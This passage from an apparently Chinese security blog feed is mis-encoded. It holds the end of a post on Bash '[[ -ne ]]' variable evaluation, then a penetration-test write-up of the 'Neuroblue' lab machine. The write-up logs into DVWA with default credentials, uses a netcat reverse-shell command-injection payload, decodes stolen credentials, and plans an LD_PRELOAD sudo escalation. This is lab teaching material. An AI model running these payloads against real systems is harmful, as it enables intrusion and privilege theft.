    ÂÅáËÆæËÑöÊú¨‰∏≠ÁöÑÈöèÊú∫Êï∞ÂèòÈáèÂ∞±ÊòØ `a` (‰æãÂ¶Ç `a=42`)„ÄÇÂú®Ëøô‰∏™Ë°®ËææÂºè‰∏≠Ôºö
    1.  Á¨¨‰∏Ä‰∏™ `a` **Ê≤°ÊúâÂºïÂè∑**„ÄÇBash ‰ºöÂ∞ùËØïÊü•ÊâæÂêç‰∏∫ `a` ÁöÑÂèòÈáè„ÄÇ
    2.  ÂÆÉÊâæÂà∞‰∫ÜÔºåÂÄº‰∏∫ `42`„ÄÇË°®ËææÂºèÂèò‰∏∫ `[[ 42 -ne '$a' ]]`„ÄÇ
    3.  Á¨¨‰∫å‰∏™ `$a` Ë¢´Êâ©Â±ï‰∏∫ÂÖ∂ÂÄº `42`„ÄÇË°®ËææÂºèÂèò‰∏∫ `[[ 42 -ne 42 ]]`„ÄÇ
    4.  ÁÆóÊúØÊØîËæÉ `42 -ne 42` ÁöÑÁªìÊûúÊòØ **false** (Âõ†‰∏∫ÂÆÉ‰ª¨Áõ∏Á≠â)Ôºå`[[` ÂëΩ‰ª§ÈÄÄÂá∫Áä∂ÊÄÅ‰∏∫ **1**„ÄÇ
    5.  `if` ËØ≠Âè•ÁúãÂà∞ÈÄÄÂá∫Áä∂ÊÄÅ 1ÔºåÊù°‰ª∂Âà§Êñ≠‰∏∫ **false**Ôºå‰ªéËÄåË∑≥Ëøá `exit 1`„ÄÇ

*   **Á§∫‰æã 2: `[[ b -ne '$a' ]]`**
    ÂÅáËÆæÂèòÈáè `b` Êú™ÂÆö‰πâÔºö
    1.  Á¨¨‰∏Ä‰∏™ `b` **Ê≤°ÊúâÂºïÂè∑**„ÄÇBash Â∞ùËØïÊü•ÊâæÂêç‰∏∫ `b` ÁöÑÂèòÈáè„ÄÇ
    2.  Êú™ÊâæÂà∞„ÄÇÊ†πÊçÆ Bash ÁöÑËÆæÁΩÆÔºà‰æãÂ¶Ç `set -u` ÊòØÂê¶ÂºÄÂêØÔºâÔºåËøôÂèØËÉΩÂØºËá¥ÈîôËØØÔºåÊàñËÄÖÊú™ÂÆö‰πâÁöÑÂèòÈáèË¢´ËßÜ‰∏∫Á©∫Â≠óÁ¨¶‰∏≤Êàñ 0„ÄÇ
    3.  Â¶ÇÊûúËßÜ‰∏∫Á©∫Êàñ 0ÔºåÂÅáËÆæ `$a` ÊòØ 42ÔºåË°®ËææÂºèÂèØËÉΩÂèò‰∏∫ `[[ 0 -ne 42 ]]` Êàñ `[[ '' -ne 42 ]]`„ÄÇ
    4.  `[[ 0 -ne 42 ]]` ÁªìÊûú‰∏∫ **true** (ÈÄÄÂá∫Áä∂ÊÄÅ 0)„ÄÇ`if` Êù°‰ª∂Êª°Ë∂≥ÔºåÊâßË°å `exit 1`„ÄÇ
    5.  `[[ '' -ne 42 ]]` ‰∏≠Á©∫Â≠óÁ¨¶‰∏≤‰∏çÊòØÊúâÊïàÊï¥Êï∞Ôºå`-ne` Êìç‰ΩúÂ§±Ë¥•Ôºå`[[` ÈÄÄÂá∫Áä∂ÊÄÅ **ÈùûÈõ∂**„ÄÇ`if` Êù°‰ª∂Âà§Êñ≠‰∏∫ **false**ÔºåË∑≥Ëøá `exit 1`„ÄÇÔºàËøôÊõ¥Êé•ËøëÊàë‰ª¨‰πãÂâçÁî® `aaa` ÁöÑÊÉÖÂÜµÔºâ

**Â§ß‰Ω¨ÊÉ≥Âº∫Ë∞ÉÁöÑÊòØÔºö** ËæìÂÖ•ÁöÑÂ≠óÁ¨¶ÔºàÂ¶ÇÊûúÊú™Âä†ÂºïÂè∑‰∏îÁ¨¶ÂêàÂèòÈáèÂêçËßÑÂàôÔºâÂú® `[[ ]]` Ëøô‰∏™ÁâπÂÆö‰∏ä‰∏ãÊñá‰∏≠ÔºåÂèØËÉΩ‰∏ç‰ºöË¢´ÁÆÄÂçïÂú∞ÂΩì‰ΩúÂ≠óÈù¢Â≠óÁ¨¶‰∏≤ÔºåËÄåÊòØ‰ºöËß¶Âèë**ÂèòÈáèËß£Êûê**ÁöÑÂ∞ùËØï„ÄÇ

## ‰∏é Python 2 `input()` ÁöÑÁ±ªÊØî

Ëøô‰∏é Python 2 ÁöÑ `input()` ÂáΩÊï∞Ë°å‰∏∫Á°ÆÂÆûÊúâÂÖ±ÈÄö‰πãÂ§ÑÔºö

*   **Python 2 `input()`:** ËØªÂèñÁî®Êà∑ËæìÂÖ•ÔºåÂπ∂Â∞ùËØïÂ∞ÜÂÖ∂‰Ωú‰∏∫ Python **Ë°®ËææÂºè**Êù•Ê±ÇÂÄº„ÄÇËæìÂÖ• `my_var` ‰ºöÊü•ÊâæÂèòÈáè `my_var`ÔºõËæìÂÖ• `1+1` ‰ºöÂæóÂà∞ `2`ÔºõËæìÂÖ• `aaa` (Êú™ÂÆö‰πâ) ‰ºöÊäõÂá∫ `NameError`„ÄÇ
*   **Bash `[[ unquoted_string ... ]]`:** Âú®ÁâπÂÆöÊìç‰ΩúÁ¨¶ÔºàÂ¶ÇÁÆóÊúØÊØîËæÉ `-ne`ÔºâÁöÑ‰∏ä‰∏ãÊñá‰∏≠ÔºåÊú™Âä†ÂºïÂè∑ÁöÑÂ≠óÁ¨¶‰∏≤ `unquoted_string` ÂèØËÉΩË¢´Â∞ùËØï‰Ωú‰∏∫**ÂèòÈáè** `$unquoted_string` ËøõË°åÊâ©Â±ï„ÄÇ

‰∏§ËÄÖÈÉΩ‰ΩìÁé∞‰∫Ü **‚ÄúËæìÂÖ•‰∏ç‰ªÖ‰ªÖÊòØÂ≠óÈù¢ÈáèÔºåËÄåÊòØ‰ºöË¢´Ëß£ÈáäÂô®/ShellÂ∞ùËØïËøõË°åÊüêÁßçÂΩ¢ÂºèÁöÑËß£ÊûêÊàñÊ±ÇÂÄº‚Äù** ÁöÑÁâπÁÇπ„ÄÇÂ¶ÇÊûúËß£ÊûêÂ§±Ë¥•ÔºàPython ‰∏≠ `NameError`ÔºåBash ‰∏≠ÁÆóÊúØÊØîËæÉÂõ†Á±ªÂûãÈîôËØØÂ§±Ë¥•ÔºâÔºåÊàñËÄÖËß£ÊûêÂêéÁöÑÁªìÊûúÊª°Ë∂≥‰∫ÜÊüêÁßçÊù°‰ª∂ÔºàBash ‰∏≠ÂèòÈáèËß£ÊûêÂêéÊÅ∞Â•ΩÁõ∏Á≠âÂØºËá¥ `-ne` ‰∏∫ falseÔºâÔºåÈÉΩÂèØËÉΩÂØºËá¥ÈùûÈ¢ÑÊúüÁöÑÁ®ãÂ∫èÊµÅÁ®ã„ÄÇ

ÊúâÁ©∫ÁöÑÂèØ‰ª•ÂéªÁúãËøô‰∏§‰∏™Â§ß‰Ω¨ÁöÑwp

II04567Ôºö

`Gmeek-html&lt;iframe src='//player.bilibili.com/player.html?isOutside=true&amp;aid=112958428482069&amp;bvid=BV1SXeje3EKg&amp;cid=500001648893827&amp;p=1' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'&gt;&lt;/iframe&gt;`

ZumpyxÔºö

`Gmeek-html&lt;iframe src='//player.bilibili.com/player.html?isOutside=true&amp;aid=658105639&amp;bvid=BV1La4y1F7o4&amp;cid=1186380191&amp;p=1' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'&gt;&lt;/iframe&gt;`

## ÁªìËÆ∫

ËøôÊ¨°ÊåëÊàòÁöÑÁ≤æÈ´ìÂú®‰∫é Bash Âú® `[[ ... ]]` ÁÆóÊúØÊØîËæÉ‰∏ä‰∏ãÊñá‰∏≠Áã¨ÁâπÁöÑÊ±ÇÂÄºËßÑÂàôÔºö

*   **ÂèòÈáèÂêçÂÜ≤Á™ÅÊòØÂÖ≥ÈîÆÔºö** ËæìÂÖ• `a` ‰πãÊâÄ‰ª•ËÉΩÈÄöËøáÔºåÊòØÂõ†‰∏∫ÂÆÉÊÅ∞Â•ΩÂåπÈÖç‰∫ÜÂ≠òÂÇ®ÈöèÊú∫Êï∞ÁöÑÂèòÈáèÂêçÔºåÂØºËá¥ÊØîËæÉÂèòÊàê‰∫Ü `value_of_a -ne value_of_a`„ÄÇ
*   **Êú™ÂÆö‰πâÂèòÈáèËßÜ‰∏∫ 0Ôºö** ËæìÂÖ• `b`, `c` Á≠â‰πãÊâÄ‰ª•Â§±Ë¥•ÔºåÊòØÂõ†‰∏∫ÂÆÉ‰ª¨Ë¢´ÂΩì‰ΩúÂÄº‰∏∫ 0 ÁöÑÊú™ÂÆö‰πâÂèòÈáèÔºå‰ΩøÂæóÊØîËæÉ `0 -ne non_zero_random_number` ‰∏∫Áúü„ÄÇ
*   **Êó†ÊïàÊ†ºÂºèÂØºËá¥ÈîôËØØÂç≥Â§±Ë¥•Ôºö** ËæìÂÖ• `aaa` ËÉΩÈÄöËøáÔºåÊòØÂõ†‰∏∫ÂÆÉÊó†Ê≥ïË¢´ÁÆóÊúØÊ±ÇÂÄºÔºåÂØºËá¥ `[[` ÂëΩ‰ª§Âá∫ÈîôÔºàËøîÂõûÈùûÈõ∂Áä∂ÊÄÅÔºâÔºå‰ªéËÄå‰Ωø `if` Êù°‰ª∂‰∏∫ÂÅá„ÄÇ

Ëøô‰∏™Ê°à‰æãÊ∑±ÂàªÂú∞Â±ïÁ§∫‰∫ÜÁêÜËß£ Shell Â∫ïÂ±ÇÊú∫Âà∂ÁöÑÈáçË¶ÅÊÄßÔºåÂ∞§ÂÖ∂ÊòØÂú®Â§ÑÁêÜÁî®Êà∑ËæìÂÖ•ÂíåËøõË°åÊù°‰ª∂Âà§Êñ≠Êó∂„ÄÇ‰∏Ä‰∏™Áúã‰ººÁÆÄÂçïÁöÑÊØîËæÉ `[[ '$INPUTS' -ne '$a' ]]`ÔºåÂÖ∂Ë°å‰∏∫‰ºöÊ†πÊçÆ `$INPUTS` ÁöÑÂÜÖÂÆπÔºàÊï∞Â≠ó„ÄÅÂèòÈáèÂêç„ÄÅÊó†ÊïàÂ≠óÁ¨¶‰∏≤ÔºâËÄåÊà™ÁÑ∂‰∏çÂêå„ÄÇ

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:19 +0000</pubDate></item><item><title>Ê∏óÈÄèÊµãËØïÊä•Âëä - Neuroblue (ÊµãËØïÈù∂Êú∫)</title><link>https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20Neuroblue%20%28-ce-shi-ba-ji-%29.html</link><description>## Ê∏óÈÄèÊµãËØïÊä•Âëä - Neuroblue

## 1. ÁÆÄ‰ªã

**Èù∂Êú∫ÂêçÁß∞**: Neuroblue
**ÈöæÂ∫¶**: ÁÆÄÂçï
**ÊîªÂáªËÄÖ IP:** `192.168.205.188` (Kali Linux)
**ÁõÆÊ†á IP:** `192.168.205.203` (Neuroblue)

## 2. ‰ø°ÊÅØÊî∂ÈõÜ (Enumeration)

### 2.1. ÁΩëÁªúÂèëÁé∞ (Network Discovery)

‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠Êé¢ÊµãÂ≠òÊ¥ª‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l        
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.188
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       (Unknown)
192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
192.168.205.203 08:00:27:53:84:22       (Unknown) # &lt;-- ÂèëÁé∞ÁõÆÊ†á
192.168.205.254 00:50:56:ec:d6:ae       (Unknown)

Ending arp-scan 1.10.0: 256 hosts scanned in 1.871 seconds (136.83 hosts/sec). 4 responded
```

ÁõÆÊ†á‰∏ªÊú∫ IP Á°ÆÂÆö‰∏∫ `192.168.205.203`„ÄÇMAC Âú∞ÂùÄ `08:00:27:53:84:22`„ÄÇ

### 2.2. Á´ØÂè£Êâ´Êèè (Port Scanning)

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†áËøõË°åÁ´ØÂè£Êâ´ÊèèÔºåËØÜÂà´ÂºÄÊîæÁöÑ TCP Á´ØÂè£„ÄÇ

* ËøõË°åÂÖ®Á´ØÂè£Êâ´Êèè (`-p-`) Á°ÆÂÆöÂºÄÊîæÁ´ØÂè£„ÄÇ

  ```bash
  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
  ‚îî‚îÄ$ nmap -p- 192.168.205.203 
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 02:10 EDT
  Nmap scan report for 192.168.205.203
  Host is up (0.00014s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:53:84:22 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) # &lt;-- Á°ÆËÆ§ VirtualBox
  
  Nmap done: 1 IP address (1 host up) scanned in 5.15 seconds
  ```

  ÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÊîæ‰∫Ü‰∏§‰∏™Â∏∏ËßÅÁöÑÁ´ØÂè£Ôºö`22 (SSH)` Âíå `80 (HTTP)`„ÄÇ

### 2.3. Web ÊúçÂä°Êé¢Êµã (Web Enumeration)

ËÆøÈóÆ 80 Á´ØÂè£ÁöÑ HTTP ÊúçÂä° `http://192.168.205.203/wordpress/`„ÄÇ

![DVWA Login Page](https://7r1umphk.github.io/image/20250501141142075.png)

È°µÈù¢ÊòæÁ§∫‰∏∫ DVWA (Damn Vulnerable Web Application) ÁöÑÁôªÂΩïÁïåÈù¢„ÄÇDVWA ÊòØ‰∏Ä‰∏™Áü•ÂêçÁöÑÊïÖÊÑèÂåÖÂê´ÊºèÊ¥ûÁöÑ Web Â∫îÁî®ÔºåÁî®‰∫éÂÆâÂÖ®ÊµãËØïÂíåÂ≠¶‰π†„ÄÇ

DVWA ÈÄöÂ∏∏ÊúâÈªòËÆ§ÁöÑÁôªÂΩïÂá≠ÊçÆ„ÄÇ

![DVWA Logged In](https://7r1umphk.github.io/image/20250501141310014.png)

## 3. Ëé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôê (Initial Access - DVWA Command Injection)

### 3.1. ÊºèÊ¥ûÂèëÁé∞‰∏éÂà©Áî® (Vulnerability Discovery &amp; Exploitation)

* **ÁôªÂΩï DVWA:** Â∞ùËØï‰ΩøÁî® DVWA ÁöÑÈªòËÆ§Âá≠ÊçÆ `admin` / `password`„ÄÇÊàêÂäüÁôªÂΩï„ÄÇ

  ![image-20250501141405799](https://7r1umphk.github.io/image/20250501141405948.png)

* **ÂØªÊâæÊ≥®ÂÖ•ÁÇπ:** ÊµèËßà DVWA ÁöÑÂäüËÉΩÊ®°ÂùóÔºåÂèëÁé∞ 'Command Injection' Ê®°Âùó„ÄÇ

* **ÂàùÊ≠•ÊµãËØï:** Â∞ùËØïÊâßË°åÁÆÄÂçïÂëΩ‰ª§ÔºåÂ¶Ç `127.0.0.1; id`„ÄÇ

  ![Initial Command Injection Attempt (Blocked)](https://7r1umphk.github.io/image/20250501141546233.png)

  ÂàùÂßãÂ∞ùËØïË¢´ DVWA ÁöÑÂÆâÂÖ®Á∫ßÂà´ÈòªÊ≠¢„ÄÇ

* **Èôç‰ΩéÂÆâÂÖ®Á∫ßÂà´:** DVWA ÂÖÅËÆ∏Ë∞ÉÊï¥ÂÆâÂÖ®Á∫ßÂà´„ÄÇÂØºËà™Âà∞ 'DVWA Security' È°µÈù¢ÔºåÂ∞ÜÂÆâÂÖ®Á∫ßÂà´ËÆæÁΩÆ‰∏∫ 'Low'„ÄÇ

  ![Setting Security Level to Low](https://7r1umphk.github.io/image/20250501141634505.png)

* **ÂÜçÊ¨°ÊµãËØï:** Âú® 'Low' ÂÆâÂÖ®Á∫ßÂà´‰∏ãÔºåÂÜçÊ¨°Â∞ùËØïÂëΩ‰ª§Ê≥®ÂÖ•„ÄÇËæìÂÖ• `127.0.0.1; id`„ÄÇ

  ![Successful Command Injection (Low Security)](https://7r1umphk.github.io/image/20250501141746295.png)

  ÂëΩ‰ª§ `id` ÊàêÂäüÊâßË°åÔºåÁ°ÆËÆ§Â≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û„ÄÇ

* **ÊûÑÈÄ†ÂèçÂºπ Shell Payload:** ‰∏∫‰∫ÜËé∑Âèñ‰∫§‰∫íÂºè ShellÔºåÊûÑÈÄ†‰∏Ä‰∏™ÂèçÂºπ Shell Payload„ÄÇ
  Payload: `127.0.0.1;nc 192.168.205.188 8888 -e /bin/bash`

* **ËÆæÁΩÆÁõëÂê¨Âô®:** Âú®ÊîªÂáªÊú∫ (Kali) ‰∏ä‰ΩøÁî® `nc` ËÆæÁΩÆÁõëÂê¨Âô®ÔºåÁ≠âÂæÖÂèçÂºπËøûÊé•„ÄÇ

  ```bash
  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/test]
  ‚îî‚îÄ$ nc -lvnp 8888            
  listening on [any] 8888 ...
  ```

* **ÊâßË°å Payload:** Âú® DVWA ÁöÑÂëΩ‰ª§Ê≥®ÂÖ•È°µÈù¢Êèê‰∫§ÂèçÂºπ Shell Payload„ÄÇ

### 3.2. Ëé∑Âèñ Shell (Gaining Access)

Êèê‰∫§ Payload ÂêéÔºåDVWA È°µÈù¢‰ºöÊåÅÁª≠Âä†ËΩΩ„ÄÇËøîÂõû Kali ÁªàÁ´ØÔºåÁõëÂê¨Âô®Â∫îÊî∂Âà∞ËøûÊé•„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/test]
‚îî‚îÄ$ nc -lvnp 8888            
listening on [any] 8888 ...
connect to [192.168.205.188] from (UNKNOWN) [192.168.205.203] 35542 # &lt;-- ËøûÊé•ÊàêÂäü
```

* **Á®≥ÂÆö Shell:** Ëé∑ÂæóÁöÑÂàùÂßã Shell ÈÄöÂ∏∏ÂäüËÉΩÊúâÈôê„ÄÇ‰ΩøÁî®Ê†áÂáÜÊäÄÊúØÊèêÂçá‰∏∫ÂäüËÉΩÊõ¥ÂÖ®ÁöÑ TTY Shell„ÄÇ

  ```bash
  # Âú®ÂèçÂºπ shell ‰∏≠ÊâßË°å
  script /dev/null -c bash  
  # Êåâ Ctrl+Z ÊöÇÂÅú
  # Âú® Kali ÁªàÁ´ØÊâßË°å
  stty raw -echo; fg  
  # Êåâ Enter ÊÅ¢Â§çÔºåÁÑ∂ÂêéÁªßÁª≠Âú®ÂèçÂºπ shell ‰∏≠ÊâßË°å
  reset xterm  
  export TERM=xterm  
  export SHELL=/bin/bash  
  stty rows 40 columns 178 # ÂèØÈÄâÔºåË∞ÉÊï¥Â§ßÂ∞è
  ```

* **Á°ÆËÆ§Áî®Êà∑:** Ê£ÄÊü•ÂΩìÂâçÁî®Êà∑Ë∫´‰ªΩ„ÄÇ

  ```bash
  www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data) 
  ```

  ÊàêÂäü‰ª• `www-data` Áî®Êà∑Ë∫´‰ªΩËé∑ÂæóÂàùÂßãËÆøÈóÆÊùÉÈôê„ÄÇ

## 4. ÊùÉÈôêÊèêÂçá (`www-data` -&gt; `welcome` -&gt; `root`)

### 4.1. ‰ª• `www-data` Ë∫´‰ªΩËøõË°å‰ø°ÊÅØÊî∂ÈõÜ (Enumeration as `www-data`)

* **Êé¢Á¥¢ÂÆ∂ÁõÆÂΩï:** Ê£ÄÊü• `/home` ÁõÆÂΩï„ÄÇ

  ```bash
  www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ cd /home/
  www-data@Neuroblue:/home$ ls -al
  total 12
  drwxr-xr-x  3 root    root    4096 Apr 11 22:27 .
  drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
  drwxrwxrwx  2 welcome welcome 4096 Apr 30 09:17 welcome
  ```

* **Ê£ÄÊü• `welcome` ÁõÆÂΩï:** Êü•Áúã `welcome` Áî®Êà∑ÁöÑ‰∏ªÁõÆÂΩïÂÜÖÂÆπ„ÄÇ

  ```bash
  www-data@Neuroblue:/home$ cd welcome/
  www-data@Neuroblue:/home/welcome$ ls -al
  total 48
  drwxrwxrwx 2 welcome welcome  4096 Apr 30 09:17 .
  drwxr-xr-x 3 root    root     4096 Apr 11 22:27 ..
  lrwxrwxrwx 1 root    root        9 Apr 30 07:10 .bash_history -&gt; /dev/null
  -rw-r--r-- 1 welcome welcome   220 Apr 11 22:27 .bash_logout
  -rw-r--r-- 1 welcome welcome  3526 Apr 11 22:27 .bashrc
  -rw-r--r-- 1 welcome welcome   807 Apr 11 22:27 .profile
  lrwxrwxrwx 1 root    root        9 Apr 30 09:17 .viminfo -&gt; /dev/null
  -rwx--x--x 1 root    root    22208 Apr 30 08:09 2048_hack # &lt;-- ÂèØÊâßË°åÊñá‰ª∂
  -rw-r--r-- 1 root    root       44 Apr 30 07:10 user.txt # &lt;-- Áî®Êà∑ Flag
  ```

* **Ëé∑Âèñ User Flag:** ËØªÂèñ `user.txt`„ÄÇ

  ```bash
  www-data@Neuroblue:/home/welcome$ cat user.txt 
  flag{user-aa85e179cb0acf7cc4da7d2afcd53488}
  ```

* **ÂàÜÊûê `2048_hack` Á®ãÂ∫è:** Ê£ÄÊü•Ëøô‰∏™ÂèØÊâßË°åÊñá‰ª∂ÁöÑÂ∏ÆÂä©‰ø°ÊÅØ„ÄÇ

  ```bash
  www-data@Neuroblue:/home/welcome$ ./2048_hack --help
  Usage: 2048 [OPTION] | [MODE]
  Play the game 2048 in the console
  
  Options:
    -h,  --help       Show this help message.
    -v,  --version    Press x. # &lt;-- ÊúâË∂£ÁöÑÊèêÁ§∫
  
  Modes:
    bluered      Use a blue-to-red color scheme (requires 256-color terminal support).
    blackwhite   The black-to-white color scheme (requires 256-color terminal support).
  ```

  ÊèêÁ§∫ 'Press x' ÂÄºÂæóÊ≥®ÊÑè„ÄÇ

* **ËøêË°å `2048_hack` Âπ∂‰∫§‰∫í:** ËøêË°åÁ®ãÂ∫èÂπ∂Êåâ 'x' ÈîÆ„ÄÇ

  ```bash
  www-data@Neuroblue:/home/welcome$ ./2048_hack 
  # (Á®ãÂ∫èÂêØÂä®ÔºåÁî®Êà∑Êåâ 'x')
  ```

  ![2048_hack output after pressing x](https://7r1umphk.github.io/image/20250501142419714.png)

  Á®ãÂ∫èÊèêÁ§∫Âá≠ÊçÆÂ∑≤‰øùÂ≠òÂà∞ `/home/welcome/.cred`„ÄÇ

* **Ëé∑ÂèñÂá≠ÊçÆ:** Êü•ÁúãÊñ∞ÂàõÂª∫ÁöÑ `.cred` Êñá‰ª∂„ÄÇ

  ```bash
  www-data@Neuroblue:/home/welcome$ ls -la
  total 52
  drwxrwxrwx 2 welcome  welcome   4096 May  1 02:23 .
  drwxr-xr-x 3 root     root      4096 Apr 11 22:27 ..
  lrwxrwxrwx 1 root     root         9 Apr 30 07:10 .bash_history -&gt; /dev/null
  -rw-r--r-- 1 welcome  welcome    220 Apr 11 22:27 .bash_logout
  -rw-r--r-- 1 welcome  welcome   3526 Apr 11 22:27 .bashrc
  -rw-r--r-- 1 www-data www-data    52 May  1 02:23 .cred
  -rw-r--r-- 1 welcome  welcome    807 Apr 11 22:27 .profile
  lrwxrwxrwx 1 root     root         9 Apr 30 09:17 .viminfo -&gt; /dev/null
  -rwx--x--x 1 root     root     22208 Apr 30 08:09 2048_hack
  -rw-r--r-- 1 root     root        44 Apr 30 07:10 user.txt
  www-data@Neuroblue:/home/welcome$ cat .cred
  77656c636f6d653a666438363966363639333039613737636464
  ```

  ËøôÊòØ‰∏Ä‰∏≤ÂçÅÂÖ≠ËøõÂà∂ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ

* **Ëß£Á†ÅÂá≠ÊçÆ:** ‰ΩøÁî®Â∑•ÂÖ∑ÔºàÂ¶Ç CyberChef ÊàñÂú®Á∫øËΩ¨Êç¢Âô®ÔºâÂ∞ÜÂçÅÂÖ≠ËøõÂà∂Ëß£Á†Å‰∏∫ ASCII„ÄÇ

  ![Hex to ASCII conversion](https://7r1umphk.github.io/image/20250501142514282.png)

  Ëß£Á†ÅÁªìÊûú‰∏∫Ôºö`welcome:fd869f669309a77cdd`„ÄÇËøôÊòØ `welcome` Áî®Êà∑ÁöÑÂá≠ÊçÆ„ÄÇ

### 4.2. ÂàáÊç¢Áî®Êà∑ (`www-data` -&gt; `welcome`)

‰ΩøÁî®Ëé∑ÂèñÂà∞ÁöÑÂá≠ÊçÆÂàáÊç¢Âà∞ `welcome` Áî®Êà∑„ÄÇ

```bash
www-data@Neuroblue:/home/welcome$ su welcome
Password: 
welcome@Neuroblue:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

ÊàêÂäüÂàáÊç¢Âà∞ `welcome` Áî®Êà∑„ÄÇ

### 4.3. ‰ª• `welcome` Ë∫´‰ªΩËøõË°å‰ø°ÊÅØÊî∂ÈõÜ (ÂØªÊâæÊèêÊùÉÂêëÈáè)

Ê£ÄÊü• `welcome` Áî®Êà∑ÁöÑ `sudo` ÊùÉÈôê„ÄÇ

```bash
welcome@Neuroblue:/tmp$ sudo -l
Matching Defaults entries for welcome on Neuroblue:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Neuroblue:
    (root) NOPASSWD: /opt/export # &lt;-- ÂÖÅËÆ∏‰ª• root Êó†ÂØÜÁ†ÅÊâßË°å /opt/export
```

ÂêåÊó∂ÔºåÊü•Áúã `/opt/export` ËÑöÊú¨ÁöÑÂÜÖÂÆπÂíåÊùÉÈôêÔºö

```bash
welcome@Neuroblue:/tmp$ cat /opt/export
#!/bin/bash

if [ -z $1 ] ;then
        echo 'This is VMBreaker export program.'
        /usr/local/sbin/VMBreaker
        exit 1
fi

export '$1'='$2' # &lt;-- ÂÖ≥ÈîÆÔºö‰ΩøÁî®ÂèÇÊï∞ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáè
export '$3'='$4'
export '$5'='$6'
export '$7'='$8'
/usr/local/sbin/VMBreaker # &lt;-- ÊúÄÂêéÊâßË°åÂè¶‰∏Ä‰∏™Á®ãÂ∫è

welcome@Neuroblue:/tmp$ ls -al /opt/export 
-rwxr-xr-x 1 root root 207 Apr 30 08:55 /opt/export
```

**ÂÖ≥ÈîÆÂèëÁé∞:**

1.  `welcome` Áî®Êà∑ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†Å‰ª• root ÊùÉÈôêÊâßË°å `/opt/export`„ÄÇËøôÊòØÊèêÊùÉÁöÑÂÖ•Âè£„ÄÇ
2.  `sudoers` ÈÖçÁΩÆ‰∏≠ÂåÖÂê´ `env_reset`ÔºåËøôÊÑèÂë≥ÁùÄÈÄöËøá `sudo` Áõ¥Êé•‰º†ÈÄí `LD_PRELOAD` ÁéØÂ¢ÉÂèòÈáèÔºàÂ¶Ç `sudo LD_PRELOAD=... /opt/export`Ôºâ‰ºöË¢´ÈòªÊ≠¢„ÄÇ
3.  `/opt/export` ËÑöÊú¨Êú¨Ë∫´Â≠òÂú®‰∏Ä‰∏™**‰∏•ÈáçÊºèÊ¥û**ÔºöÂÆÉÂ∞ÜÂëΩ‰ª§Ë°åÂèÇÊï∞Áõ¥Êé•Áî®‰Ωú `export` ÂëΩ‰ª§ÁöÑÂèÇÊï∞ÔºåÂÖÅËÆ∏Êàë‰ª¨ÊéßÂà∂ËÑöÊú¨ÂÜÖÈÉ®ËÆæÁΩÆÁöÑÁéØÂ¢ÉÂèòÈáèÂêçÁß∞ÂíåÂÄº„ÄÇ
4.  ËÑöÊú¨ÊúÄÂêé‰ºöÊâßË°å `/usr/local/sbin/VMBreaker`„ÄÇ

### 4.4. Âà©Áî®Á≠ñÁï• (Exploitation Strategy - Exploiting Script Argument Handling for LD_PRELOAD Injection)

Êàë‰ª¨ÁöÑÁõÆÊ†áÊòØÂà©Áî® `/opt/export` ËÑöÊú¨ÁöÑÊºèÊ¥ûÊù•ËÆæÁΩÆ `LD_PRELOAD` ÁéØÂ¢ÉÂèòÈáèÔºå‰ªéËÄåÂä´ÊåÅÂêéÁª≠ `/usr/local/sbin/VMBreaker` ÁöÑÊâßË°åÊµÅÁ®ã„ÄÇ

ËÆ°ÂàíÔºö

1.  ÁºñÂÜô‰∏Ä‰∏™ C Êñá‰ª∂ (`exp.c`)ÔºåÂåÖÂê´‰∏Ä‰∏™ÊûÑÈÄ†ÂáΩÊï∞ (`__attribute__((constructor))`)„ÄÇËøô‰∏™ÂáΩÊï∞‰ºöÂú®Â∫ìË¢´Âä†ËΩΩÊó∂Ëá™Âä®ÊâßË°åÔºåÂÖ∂ÂäüËÉΩÊòØËÆæÁΩÆ `uid` Âíå `gid` ‰∏∫ 0ÔºåÁÑ∂ÂêéÂêØÂä®‰∏Ä‰∏™ÂÖ∑Êúâ root ÊùÉÈôêÁöÑ shell (`/bin/bash -p`)„ÄÇ
2.  Â∞Ü `exp.c` ÁºñËØëÊàêÂÖ±‰∫´Â∫ìÊñá‰ª∂ `/tmp/exp.so`„ÄÇ
